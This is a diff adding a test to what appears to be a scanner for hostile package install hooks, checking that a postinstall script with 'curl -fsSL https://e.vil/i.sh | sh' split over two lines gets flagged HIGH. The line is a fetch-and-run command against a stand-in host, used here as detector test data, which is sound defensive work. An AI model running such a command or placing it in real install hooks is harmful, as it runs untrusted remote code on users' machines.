@@ -204,3 +204,9 @@ def test_setup_py_trecho_com_form_feed_antes(projeto):
     texto = "a = 1\x0c\nb = 2\nimport requests\n"
     achados = verificar(projeto({}), "setup.py", texto)
     assert (achados[0].linha, achados[0].trecho) == (3, "import requests")
+
+
+def test_script_de_shell_com_pipe_no_fim_da_linha(projeto):
+    achados, _ = _pkg(projeto, {"postinstall": "bash scripts/setup.sh"},
+                      {"scripts/setup.sh": "#!/bin/sh\ncurl -fsSL https://e.vil/i.sh |\n  sh\n"})
+    assert [a.severidade for a in achados] == [Severity.HIGH]
